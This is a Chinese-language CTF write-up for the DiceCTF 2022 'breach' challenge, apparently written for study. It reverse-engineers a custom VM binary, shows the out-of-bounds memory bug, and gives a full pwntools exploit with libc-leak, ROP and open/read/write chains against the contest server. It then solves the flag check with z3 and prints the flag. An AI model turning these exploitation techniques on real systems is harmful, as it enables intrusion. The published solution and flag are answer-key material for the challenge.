# DiceCTF2022-containment/breach


# DiceCTF2022-containment/breach

一个不一样的虚拟机。一个简单的虚拟机的二进制文件通过利用它来 "突破 "虚拟机，安装新的指令处理程序来进行flag检查。

a binary for a simple VM "breaks out" of the VM by exploiting it and installs new instruction handlers to do flag checking.

## 程序分析

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 next_pc; // rax
  unsigned __int8 opclass; // [rsp-59h] [rbp-61h]
  unsigned __int8 reg_idx; // [rsp-4Dh] [rbp-55h]
  __int64 tmp_val; // [rsp-48h] [rbp-50h]
  FILE *fd; // [rsp-40h] [rbp-48h]
  __int64 size; // [rsp-38h] [rbp-40h]
  unsigned __int64 dst_reg; // [rsp-20h] [rbp-28h]
  unsigned __int64 src_reg; // [rsp-18h] [rbp-20h]

  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  if ( argc != 2 )
  {
    printf("Usage: %s program.bin\n", *argv);
    exit(0);
  }
  fd = fopen(argv[1], "rb");
  fseek(fd, 0LL, 2);
  size = ftell(fd);
  fseek(fd, 0LL, 0);
  code = (char *)malloc(size);
  fread(code, 1uLL, size, fd);
  while ( !exited )
  {
    opclass = code[pc] & 0xF;
    if ( opclass > 0xAu )
    {
      printf("Unknown instruction: %d\n", opclass);
      exit(-1);
    }
    switch ( opclass )
    {
      case 0u:
        exited = 1;
        ++pc;
        break;
      case 1u:                                  // mov reg, imm
        Reg_list[(unsigned __int8)code[pc] >> 4] = *(_QWORD *)&code[pc + 1];
        pc += 9LL;
        break;
      case 2u:                                  // mov reg, reg
        Reg_list[code[pc + 1] & 0xF] = Reg_list[(unsigned __int8)code[pc + 1] >> 4];
        pc += 2LL;
        break;
      case 3u:                                  // alu dst, src
        reg_idx = code[pc + 1] & 0xF;
        dst_reg = Reg_list[reg_idx];
        src_reg = Reg_list[(unsigned __int8)code[pc + 1] >> 4];
        if ( (unsigned __int8)((unsigned __int8)code[pc] >> 4) <= 7u )
        {
          switch ( (unsigned __int8)code[pc] >> 4 )
          {
            case 0:
              tmp_val = dst_reg + src_reg;
              break;
            case 1:
              tmp_val = dst_reg - src_reg;
              break;
            case 2:
              tmp_val = src_reg * dst_reg;
              break;
            case 3:
              tmp_val = dst_reg % src_reg;
              break;
            case 4:
              tmp_val = src_reg & dst_reg;
              break;
            case 5:
              tmp_val = src_reg | dst_reg;
              break;
            case 6:
              tmp_val = src_reg ^ dst_reg;
              break;
            case 7:
              tmp_val = dst_reg >> src_reg;
              break;
          }
        }
        Reg_list[reg_idx] = tmp_val;
        pc += 2LL;
        break;
      case 4u:                                  // mov ds:[reg], reg
        *(__int64 *)((char *)data_seg + Reg_list[code[pc + 1] & 0xF]) = Reg_list[(unsigned __int8)code[pc + 1] >> 4];
        pc += 2LL;
        break;
      case 5u:                                  // mov reg, ds:[reg]
        Reg_list[(unsigned __int8)code[pc + 1] >> 4] = *(__int64 *)((char *)data_seg + Reg_list[code[pc + 1] & 0xF]);
        pc += 2LL;
        break;
      case 6u:                                  // mov reg, cs:[reg]
        Reg_list[(unsigned __int8)code[pc + 1] >> 4] = *(_QWORD *)&code[Reg_list[code[pc + 1] & 0xF]];
        pc += 2LL;
        break;
      case 7u:                                  // jmp imm
        pc = *(_QWORD *)&code[pc + 1];
        break;
      case 8u:                                  // jmp reg
        pc = Reg_list[(unsigned __int8)code[pc] >> 4];
        break;
      case 9u:                                  // cmp and jmp
        if ( Reg_list[code[pc + 1] & 0xF] == Reg_list[(unsigned __int8)code[pc + 1] >> 4] )
          next_pc = *(_QWORD *)&code[pc + 2];
        else
          next_pc = pc + 10;
        pc = next_pc;
        break;
      case 0xAu:                                // puts reg
        printf("r%d = 0x%lx\n", code[pc + 1] & 0xF, Reg_list[code[pc + 1] & 0xF]);
        pc += 2LL;
        break;
    }
  }
  return 0;
}
```

虚拟机共16个64位寄存器（R0-R15）在bss段，其中R15为rsp，代码段cs在堆上，数据段和栈段为同一个在bss中。共实现了11个指令：

|        hlt        |          exited 标志设为1，停止执行           |
| :---------------: | :-------------------------------------------: |
|   mov reg, imm    |                  立即数传送                   |
|   mov reg, reg    |                 寄存器值传送                  |
|   alu dst, src    |            对两寄存器的值进行计算             |
| mov ds:[dst], src | src寄存器的值，送入ds段基址+dst值偏移的地址中 |
| mov dst, ds:[src] |  加载ds段基址+src值偏移的地址的值到dst寄存器  |
| mov dst, cs:[src] |  加载cs段基址+src值偏移的地址的值到dst寄存器  |
|      jmp imm      |                 跳转到指定pc                  |
|      jmp reg      |             跳转到寄存器指定值处              |
|  jeq r1, r2, imm  |                  相等则跳转                   |
|     puts reg      |              输出指定寄存器的值               |

## Pwn

### 指令分析

虽然作者在赛后给出了汇编文件，但是个人看着不习惯，又将breach.bin自己进行了翻译，更接近x86汇编。

虚拟机本身的漏洞点在访问内存时没有检查偏移的范围，造成通过代码段cs和数据段ds越界读写。cs在堆上，ds在bss中。ds的附近有libc和重要的地址信息，可以泄露各部分的基址。

![image-20220214162749064](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225424.png)

读取计算偏移即可实现任意地址读写。

breach.bin中为作者的payload。它实现了虚拟机的逃逸，然后将栈迁移到堆上，消除了栈地址的不确定，只需要向fake-stack中写入rop，就可以实现虚拟机不支持的功能，然后又回到虚拟机中继续执行。

breach.bin的各个函数地址都是固定的，通过jmp可以直接调用。如果需要返回需要提前将下一条指令的地址写入栈中。如程序开始这段。

```assembly
[0x0000] (1) :: mov r15, 0x10000    ; r15 = 0x10000
; call
[0x0009] (1) :: mov r0, 0x8         ; r0 = 0x8
[0x0012] (3) :: sub r15, r0         ; r0 = 0x8, r15 = 0xfff8
[0x0014] (1) :: mov r0, 0x28        ; r0 = 0x28, r15 = 0xfff8
[0x001d] (4) :: mov ds:[r15], r0    ; ds:[0xfff8] = 0x28 
[0x001f] (7) :: jmp 0x59
; ret
[0x23bd] (5) :: mov r1, ds:[r15]
[0x23bf] (1) :: mov r0, 0x8
[0x23c8] (3) :: add r15, r0
[0x23ca] (8) :: jmp r1  
```

breach.bin先计算main函数的返回地址然后通过`stack_povit [0x276d]`，写栈劫持的rop。之后就是不断在fake_stack中写rop。

在程序中，对gadget和一些str进行了简单的异或操作，`(val | (type<<56) )^0x676e614765636944`，type标识了这个数据是立即数（0x00），libc偏移（0x34），程序偏移（0x56）或跳过（0x99）。`0xdeadbeefdeadbeef ^ 0x676e614765636944`代表这段数据写完了，可以退出循环了。

![image-20220214164549592](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225949.png)

对应的汇编如下：

```assembly
[0x2681] (6) :: mov r0, cs:[r5]							; 取数据到r0
[0x2683] (1) :: mov r1, 0x676e614765636944
[0x268c] (3) :: xor r0, r1									; 得到原始数据
[0x268e] (1) :: mov r1, 0xdeadbeefdeadbeef  ; 是否结束
[0x2697] (9) :: jeq r0, r1, 0x2745
[0x26a1] (2) :: mov r6, r0
[0x26a3] (2) :: mov r7, r0
[0x26a5] (1) :: mov r0, 0xffffffffffffff    ; 取得val
[0x26ae] (3) :: and r6, r0
[0x26b0] (1) :: mov r0, 0x38
[0x26b9] (3) :: shr r7, r0									; 取得type
[0x26bb] (1) :: mov r0, 0x0
[0x26c4] (9) :: jeq r7, r0, 0x26fd					; imm？
[0x26ce] (1) :: mov r0, 0x34
[0x26d7] (9) :: jeq r7, r0, 0x2708          ; libc gadget？
[0x26e1] (1) :: mov r0, 0x56
[0x26ea] (9) :: jeq r7, r0, 0x2717          ; text gadget？
[0x26f4] (7) :: jmp 0x2726

[0x26fd] (4) :: mov ds:[r4], r6
[0x26ff] (7) :: jmp 0x2726

[0x2708] (2) :: mov r0, r2									; r2 = libc base
[0x270a] (3) :: add r0, r6
[0x270c] (4) :: mov ds:[r4], r0
[0x270e] (7) :: jmp 0x2726

[0x2717] (2) :: mov r0, r3									; r3 = text base
[0x2719] (3) :: add r0, r6
[0x271b] (4) :: mov ds:[r4], r0
[0x271d] (7) :: jmp 0x2726

[0x2726] (1) :: mov r0, 0x8       					; 移动指向fake stack和cs数据的指针
[0x272f] (3) :: add r5, r0
[0x2731] (1) :: mov r0, 0x8
[0x273a] (3) :: add r4, r0
[0x273c] (7) :: jmp 0x2681

[0x2745] (5) :: mov r7, ds:[r15]            ; 移动指针，并ret，从栈中取得pc，jmp
[0x2747] (1) :: mov r0, 0x8
[0x2750] (3) :: add r15, r0
[0x2752] (5) :: mov r6, ds:[r15]
[0x2754] (1) :: mov r0, 0x8
[0x275d] (3) :: add r15, r0
[0x275f] (5) :: mov r1, ds:[r15]
[0x2761] (1) :: mov r0, 0x8
[0x276a] (3) :: add r15, r0
[0x276c] (8) :: jmp r1                      ; 0x2658

[0x2658] (0) :: hlt													; trigger
```

执行rop后，将循环标志置零，设置rax为`text+193B`，call rax继续运行虚拟机。breach.bin还实现了较为通用的syscall函数，可以设置多个参数。通过几个gadget设置寄存器的值，然后通过在固定的栈帧写值即可实现，控制寄存器实现syscall。在rop链数据区将对应的位置空出。

```assembly
[0x2353] (1) :: mov r0, 0x8008
[0x235c] (4) :: mov ds:[r0], r12   ; fake_stack[1]
[0x235e] (1) :: mov r0, 0x8018
[0x2367] (4) :: mov ds:[r0], r13   ; fake_stack[3]
[0x2369] (1) :: mov r0, 0x8050
[0x2372] (4) :: mov ds:[r0], r8    ; fake_stack[10]
[0x2374] (1) :: mov r0, 0x8060
[0x237d] (4) :: mov ds:[r0], r9	   ; fake_stack[12]
[0x237f] (1) :: mov r0, 0x8070
[0x2388] (4) :: mov ds:[r0], r10   ; fake_stack[14]
[0x238a] (1) :: mov r0, 0x8080
[0x2393] (4) :: mov ds:[r0], r11   ; fake_stack[16]
[0x2395] (1) :: mov r4, 0x287b
[0x239e] (1) :: mov r0, 0x8
[0x23a7] (3) :: sub r15, r0
[0x23a9] (1) :: mov r0, 0x23bd
[0x23b2] (4) :: mov ds:[r15], r0
[0x23b4] (7) :: jmp 0x2504

[0x2504] (2) :: mov r5, r4					; r5 = 0x287b _rop_syscall
[0x2506] (1) :: mov r4, 0x8000
[0x250f] (1) :: mov r0, 0x8
[0x2518] (3) :: sub r15, r0
[0x251a] (1) :: mov r0, 0x252e
[0x2523] (4) :: mov ds:[r15], r0
[0x2525] (7) :: jmp 0x2667				 ; 写rop链
```

下面是其rop链：

```assembly
; 进行系统调用
rop_syscall:
pop rdx  pop rcx  pop rbx  ret
empty
empty
empty
pop rax  ret
ret
mov r10, rdx  jmp rax
mov r8, rbx  mov rax, r8  pop rbx  ret
empty
pop rax  ret
empty
pop rdi  ret
empty
pop rsi  ret
empty
pop rdx  pop rcx  pop rbx  ret
empty
empty
empty
syscall ret
pop rbx  ret
textg: 0x140a0
mov qword ptr [rbx], rax  pop rax  pop rdx  pop rbx  ret
const: 0x0
const: 0x0
const: 0x0

; 将循环标志置零，返回main继续执行
ret_main:
pop rax  ret
textg: 0x193b
pop rdi  ret
textg: 0x4048
pop rcx  ret
const: 0x0
mov qword ptr [rdi], rcx  ret
pop rdi  ret
textg: 0xc060
pop rcx  ret
call rax
mov qword ptr [rdi], rcx  ret
pop rbp  ret
textg: 0xc000
pop rsp  ret
textg: 0xc060
```

知道了breach实现各种调用的原理，下面对其调用进行分析，为了搞懂程序流程，通过strace查看：

![image-20220214172720968](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230052.png)

程序调用了pipe和fork，可以猜测出它通过父进程读取flag输入，然后传送给子进程判断，子进程检查flag是否正确。再将结果返回给父进程。

![image-20220214173756148](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230057.png)

父进程还实现了沙盒，我们dump一下规则：

![image-20220214173349031](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230003.png)

没有open。

### Vuln

下面通过调试寻找利用点。我们发现主程序读取输入到堆上的cs头部。分析指令

```assembly
[0x1eaa] (1) :: mov r0, 0x1
[0x1eb3] (9) :: jeq r8, r0, 0x2085
; ret
[0x2085] (5) :: mov r1, ds:[r15]
[0x2087] (1) :: mov r0, 0x8
[0x2090] (3) :: add r15, r0
[0x2092] (8) :: jmp r1		; 0x28
```

父进程会在0x1eaa处比较r8与1，而r8是系统调用的返回值。如果返回值为1，则会到0x2085执行，然后返回到0x28处。我们可以溢出到0x28，使得父进程执行任意的指令。

此时的虚拟机寄存器：

```python
'''
r0 = 0x8
r1 = 0x28
r2 = libc base
r3 = text base
r4 = (fake_stack - data segment) + 0x150
r5 = offset(cs data - cs)
r6 = text base
r7 = stack return addr

r8 = 1              ; rax
r9 = 0              ; rdi
r10 = 0x7fb0        ; rsi
r11 = fake_stack    ; rdx
'''
```

我们有56字节的空间，虚拟机的任何系统调用都要使用fake_stack完成，我们可以通过调用虚拟机实现的syscall调用read，向fake_stack写入rop链，从而控制父进程。

控制父进程后，由于不能使用open，还是不能打开flag。但是子进程没有这个限制，在strace中我们可以看到子进程会先读取父进程传递的输入的size，而且调试后可以发现子进程也是向代码段读取输入，并且会回到0x4bc执行虚拟机指令。同理我们可以给子进程一个很大的size，发送payload覆盖子进程的虚拟机指令，然后在子进程中实现fake_stack的栈溢出。从而控制子进程读取flag，并返回给父进程。父进程读取并输出即可。

### Exp

```python
from pwn import *
leak = lambda name,addr: log.success('{0}\t--->\t{1}'.format(name, hex(addr)))

binary = './breach'
libc = './libc.so.6'
context.terminal = ['tmux', 'splitw', '-h']
# context.binary = binary
# context.log_level='debug'
# p = gdb.debug(["./breach", "./breach.bin"], '''
#               b fopen
#               follow child
#               ''')
p = remote('mc.ax',  31618)
elf = ELF(binary, checksec=False)
libc = ELF(libc, checksec=False)

alu_list = {
    "+": 0,
    "-": 1,
    "*": 2,
    "%": 3,
    "&": 4,
    "|": 5,
    "^": 6,
    ">>": 7
}

def Exit(): # 1
    return "\x00"
def Mov_r_i(dst, imm): # 9
    opcode = p8((dst<<4)+1) + p64(imm)
    return opcode
def Mov_r_r(dst, src): # 2
    opcode = p8(2) + p8((src<<4) + dst)
    return opcode
def Alu(op, dst, src): # 2
    opcode = p8((alu_list[op]<<4)+3) + p8((src<<4) + dst)
    return opcode
def Mov_d_r(dst, src): # 2
    opcode = p8(4) + p8((src<<4) + dst)
    return opcode
def Mov_r_d(dst, src): # 2
    opcode = p8(5) + p8((dst<<4) + src)
    return opcode
def Mov_r_c(dst, src): # 2
    opcode = p8(6) + p8((dst<<4) + src)
    return opcode
def Jmp_i(imm):  # 9   
    opcode = p8(7) + p64(imm)
    return opcode
def Jmp_r(reg): 
    opcode = p8((reg<<4)+8)
    return opcode
def Cmp_j(dst, src, imm):
    opcode = p8(9) + p8((dst<<4) + src) + p64(imm)
    return opcode
def Show(reg):
    opcode = p8(10) + p8(reg)
    return opcode
def Showall():
    opcode = ''
    for i in range(10):
        opcode += p8(10) + p8(i)
    return opcode

'''
r0 = 0x8
r1 = 0x28
r2 = libc base
r3 = text base
r4 = (fake_stack - data segment) + 0x150
r5 = offset(csdata - cs)
r6 = text base
r7 = stack return addr

r8 = 1              ; rax
r9 = 0              ; rdi
r10 = 0x7fb0        ; rsi
r11 = fake_stack    ; rdx
'''

insns = 'a'*0x28
insns += Show(2)
insns += Show(11)
# read(0, fake_stack, 0x2873)
insns += Mov_r_r(8, 9)   # rax = 0 rdi = 0
insns += Mov_r_r(10, 11) # rsi = fake_stack
insns += Mov_r_r(11, 5)  # rdx = 0x2873
insns += Jmp_i(0x2353)

p.sendafter(": ", insns)
p.sendafter(": ", "\n") # trigger

p.recvuntil("r2 = 0x")
libc_base = int(p.recvuntil("\n", drop=True), 16)
leak('libc base', libc_base)

p.recvuntil("r11 = 0x")
fake_stack = int(p.recvuntil("\n", drop=True), 16)
leak('fake_stack', fake_stack)

pop_rdi = libc_base + 0x0000000000026b72
pop_rsi = libc_base + 0x0000000000027529
pop_rdx_r12 = libc_base + 0x000000000011c371

# Now, we control parent to interactive with child
# give it a large size to overflow child's rom and control it
payload = "a"*0xa0
# parent read size
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x8)*2 + p64(libc_base+libc.sym["read"])
# write(5, fake_stack, 8) to child
payload += p64(pop_rdi) + p64(5) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x8)*2 + p64(libc_base+libc.sym["write"])
# parent read payload
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym["read"])
# write(5, fake_stack, 0x1000) to child
payload += p64(pop_rdi) + p64(5) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym["write"])
# parent read orw payload
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym["read"])
# write(5, fake_stack, 0x1000) to child
payload += p64(pop_rdi) + p64(5) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym["write"])
# read flag from child
payload += p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x30)*2 + p64(libc_base+libc.sym["read"])
# write flag to stdout
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x30)*2 + p64(libc_base+libc.sym["write"])
sleep(0.5)
p.sendline(payload)

sleep(0.5)
p.send(p64(0x1000)) # size

# payload read(4, cs, 0x30)
child_insns = "a"*0x4bc
child_insns += Mov_r_i(8, 0)                    # rax = 0
child_insns += Mov_r_i(9, 4)                    # rdi = 0
child_insns += Mov_r_i(10, fake_stack)          # rsi = fake_stack
child_insns += Mov_r_i(11, 0x1000)              # rdx = 0x1000
child_insns += Jmp_i(0x2353)                    # syscall

sleep(0.5)
p.sendline(child_insns) 

orw = p64(pop_rdi+1)*0x20
orw += p64(pop_rdi) + p64(fake_stack+8*(0x20+18)) + p64(pop_rsi) + p64(0) + p64(libc_base+libc.sym["open"])
orw += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x30)*2 + p64(libc_base+libc.sym["read"])
orw += p64(pop_rdi) + p64(7) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(libc_base+libc.sym["write"])
orw += "/app/flag.txt\x00"
p.sendline(orw) 

p.interactive()

```

远程没关，打一下：

![image-20220214182435094](https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230011.png)

可以看出题目的主要难度为逆向，洞倒是很简单。不过这种虚拟机题目的思路感觉很有创意。

## Rev

通过之前的分析，子进程检查了我们的输入，逆向的部分就在这里。

### 指令分析

```assembly
child_main:
[0x019e] (1) :: mov r8, 0x2004
[0x01a7] (1) :: call close_ptr
[0x01c6] (1) :: mov r8, 0x2008
[0x01cf] (1) :: call close_ptr
[0x01ee] (1) :: mov r8, 0x0
[0x01f7] (1) :: call close
[0x0216] (1) :: mov r8, 0x1
[0x021f] (1) :: call close
[0x023e] (7) :: jmp child_handler
```

子进程关闭了pipe和标准输入输出。接着又调用了`patch_cmd`

### patch_cmd

```assembly
patch_cmd:
[0x0247] (1) :: mov r8, 0xa
[0x0250] (1) :: mov r9, 0x1000
[0x0259] (3) :: add r9, r3
[0x025b] (1) :: mov r10, 0x2000
[0x0264] (1) :: mov r11, 0x7
[0x026d] (1) :: call do_syscall         ; mprotect(text_base + 0x1000, 0x2000, 7)
[0x028c] (1) :: mov r0, 0x2020
[0x0295] (5) :: mov r1, ds:[r0]         ; code_ptr
[0x0297] (1) :: mov r0, 0x2a23
[0x02a0] (3) :: add r1, r0              ; code_ptr + 0x2a23
[0x02a2] (2) :: mov r9, r1
[0x02a4] (1) :: mov r8, 0x1a00
[0x02ad] (3) :: add r8, r3                 ; text_base + 0x1a00
[0x02af] (1) :: mov r1, 0x2bf6
[0x02b8] (1) :: mov r0, 0x2a23
[0x02c1] (3) :: sub r1, r0                ; size
[0x02c3] (1) :: mov r0, 0x3
[0x02cc] (3) :: shr r1, r0                ; size // 8
[0x02ce] (2) :: mov r10, r1
[0x02d0] (1) :: call memcpy               ; memcpy(text_base + 0x1a00, code_ptr + 0x2a23, 0x1d3)
[0x02ef] (1) :: mov r9, 0xfffff9bcfffff7c8
[0x02f8] (1) :: mov r8, 0x2068
[0x0301] (3) :: add r8, r3
[0x0303] (1) :: call write_mem             ; change jmp table Show --> text_base + 0x1a00
[0x0322] (1) :: mov r8, 0xa
[0x032b] (1) :: mov r9, 0x1000
[0x0334] (3) :: add r9, r3
[0x0336] (1) :: mov r10, 0x2000
[0x033f] (1) :: mov r11, 0x5
[0x0348] (1) :: call do_syscall            ; mprotect(text_base + 0x1000, 0x2000, 5)
[0x0367] (5) :: ret
```

从breach.bind的0x2a23处的0x1d3字节的代码复制到`text_base + 0x1a00`处，又修改了0xa号指令的偏移表，使其在处理的时候会跳转到`text_base + 0x1a00`。相当于patch了0xa号指令。

dump对应指令，进行分析：

```C
__int64 __fastcall sub_1A0A(__int64 var)
{
  __int64 stack_pointer; // rdx
  char op; // bl
  __int64 result; // rax

  LOBYTE(var) = *(_BYTE *)(MEMORY[0x140E0] + MEMORY[0x4040] + 1i64);// code + pc + 1
  stack_pointer = MEMORY[0x7060];               // init: 0x3008
  op = *(_BYTE *)(MEMORY[0x140E0] + MEMORY[0x4040]) >> 4;
  if ( op )
  {
    switch ( op )
    {
      case 1:
        *(_BYTE *)(MEMORY[0x7060] + 0x4060i64) = var;
        MEMORY[0x7060] = stack_pointer + 1;
        break;
      case 2:
        *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) += *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64);
        MEMORY[0x7060] = stack_pointer - 1;
        break;
      case 3:
        *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) *= *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64);
        MEMORY[0x7060] = stack_pointer - 1;
        break;
      case 4:
        *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) ^= *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64);
        MEMORY[0x7060] = stack_pointer - 1;
        break;
      case 5:
        *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64) = *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64) == 0;
        break;
      case 6:
        *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) &= *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64);
        MEMORY[0x7060] = stack_pointer - 1;
        break;
      case 7:
        LOBYTE(var) = 8 * var;
        *(_QWORD *)(var + 0x14060) = *(unsigned __int8 *)(MEMORY[0x7060] + 0x405Fi64);// set reg
        MEMORY[0x7060] = stack_pointer - 1;
        break;
      case 8:
        MEMORY[0x7060] = 0x3008i64;
        break;
    }
  }
  else
  {
    LOBYTE(var) = 8 * var;
    *(_BYTE *)(MEMORY[0x7060] + 0x4060i64) = *(_BYTE *)(var + 0x14060);// load reg
    MEMORY[0x7060] = stack_pointer + 1;
  }
  result = MEMORY[0x4040] + 2i64;               // pc+2
  MEMORY[0x4040] += 2i64;
  return result;
}
```

经过分析可以看出这是一个简单的字节栈机器，MEMORY[0x7060]，即rsp初始为0x3008，指向待操作的栈帧。

```c
Low     +-----+
        |	  |	<-- var1 0x405Ei64
        +-----+
        |	  | <-- var2 0x405Fi64
        +-----+
        |	  | <-- stack_pointer
        +-----+
        |	  |
High    +-----+
```

指令集如下：

|  op  | instruction |           描述           |
| :--: | :---------: | :----------------------: |
|  0   | ex.push reg |   寄存器的最低字节入栈   |
|  1   | ex.push imm |        立即数入栈        |
|  2   |   ex.add    |     栈顶上方两数相加     |
|  3   |   ex.mul    |     栈顶上方两数相乘     |
|  4   |   ex.xor    |     栈顶上方两数异或     |
|  5   |   ex.eqz    |   栈顶上方的数是否为0    |
|  6   |   ex.and    |     栈顶上方两数相与     |
|  7   |   ex.pop    | 栈顶上方的数弹出到寄存器 |
|  8   |  ex.reset   |    设置栈指针为0x3008    |

重新对flag检查部分进行分析：

```assembly
check_flag:
  mov r0, 0x0
  mov r8, cs:[r0]
  mov r0, 0xffffffffff
  and r8, r0
  mov r0, 0x7b65636964    ; 'dice{'
  jeq r8, r0, deep_check       
  jmp check_end_false
deep_check:
  ex.reset
  mov r0, 0x7
  mov r8, cs:[r0]
  mov r0, 0x1
  mov r9, cs:[r0]
  mov r0, 0x11
  mov r10, cs:[r0]
  mov r0, 0xf
  mov r11, cs:[r0]
  ex.push r8
  ex.push r9
  ex.add
  ex.push 0x2c
  ex.add
  ex.push r10
  ex.push r11
  ex.add
  ex.push 0xd8
  ex.xor
  ex.xor
  ex.push 0x10
  ex.xor
  ex.push 0xd6
  ex.xor
  ex.eqz
  mov r0, 0x1
  mov r8, cs:[r0]
  mov r0, 0x5
  mov r9, cs:[r0]
  mov r0, 0xd
  mov r10, cs:[r0]
  mov r0, 0xe
  mov r11, cs:[r0]
  ex.push r8
  ex.push r9
  ex.xor
  ex.push 0xd6
  ex.xor
  ex.push r10
  ex.push r11
  ex.xor
  ex.push 0x70
  ex.add
  ex.add
  ex.push 0xe5
  ex.xor
  ex.push 0xa6
  ex.xor
  ex.eqz
  ; ...
  mov r0, 0x24
  mov r8, cs:[r0]
  mov r0, 0x18
  mov r9, cs:[r0]
  mov r0, 0xe
  mov r10, cs:[r0]
  mov r0, 0x1a
  mov r11, cs:[r0]
  ex.push r8
  ex.push r9
  ex.add
  ex.push 0xc5
  ex.mul
  ex.push r10
  ex.push r11
  ex.mul
  ex.push 0x4d
  ex.xor
  ex.xor
  ex.push 0xfd
  ex.mul
  ex.push 0x95
  ex.xor
  ex.eqz
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.and
  ex.pop r8
  jmp check_end
check_end_false:
  mov r8, 0x0
check_end:
  ret
```

输入的开始为“dice{”后会进入deep_check，每次从我们的输入中取出4字节进行处理，共处理了79组，每段最后都会异或一个立即数，并判断当前的栈顶是否为0。最后将这79组的结果相与放入R8，即返回给父进程。正确的flag是要让这79次处理的结果都为0，让eqz返回1。

### z3-slover

根据这79个约束可以使用z3来快速求解：

```python
from z3 import *

def get_op():
    line = f.readline()
    if "add" in line:
        return '+'
    elif "mul" in line:
        return '*'
    elif "xor" in line:
        return '^'
    elif "and" in line:
        return '&'
def get_imm():
    line = f.readline()
    return int(line[10:], 16)

slov = Solver()
flag = []
for i in range(0x24+1):
    flag.append(BitVec(f'x{i}', 8))
slov.add(flag[0] == ord("d"))
slov.add(flag[1] == ord("i"))
slov.add(flag[2] == ord("c"))
slov.add(flag[3] == ord("e"))
slov.add(flag[4] == ord("{"))
slov.add(flag[0x24] == ord('}'))

f = open("./test.txt", "r")
for i in range(79):
    line = f.readline()  
    r8 = int(line[10:], 16)
    f.readline()         

    line = f.readline()  
    r9 = int(line[10:], 16)
    f.readline()

    line = f.readline()  
    r10 = int(line[10:], 16)
    f.readline()

    line = f.readline()  
    r11 = int(line[10:], 16)
    f.readline()
    # print("r8: {}, r9: {}, r10: {}, r11: {}".format(r8, r9, r10, r11))

    f.readline()
    f.readline()
    op1 = get_op()

    imm1 = get_imm()
    op2 = get_op()

    f.readline()
    f.readline()
    op3 = get_op()

    imm2 = get_imm()
    op4 = get_op()

    op5 = get_op()

    imm3 = get_imm()
    op6 = get_op()
    
    imm4 = get_imm()

    f.readline()
    f.readline() # eqz
    eq = f'((((flag[{r8}] {op1} flag[{r9}]) {op2} {imm1}) {op5} ((flag[{r10}] {op3} flag[{r11}]) {op4} {imm2})) {op6} {imm3}) == {imm4}'
    # print(eq)
    slov.add(eval(eq))

if slov.check() == sat:
    result = slov.model()
    str = [' ']*0x30
    for i in result:
        idx = int(i.name()[1:])
        str[idx] = chr(result[i].as_long())
    print(''.join(str))
else:
    print("[!] No result")
# dice{st4ying_ins1de_vms_1s_0verr4ted}
```

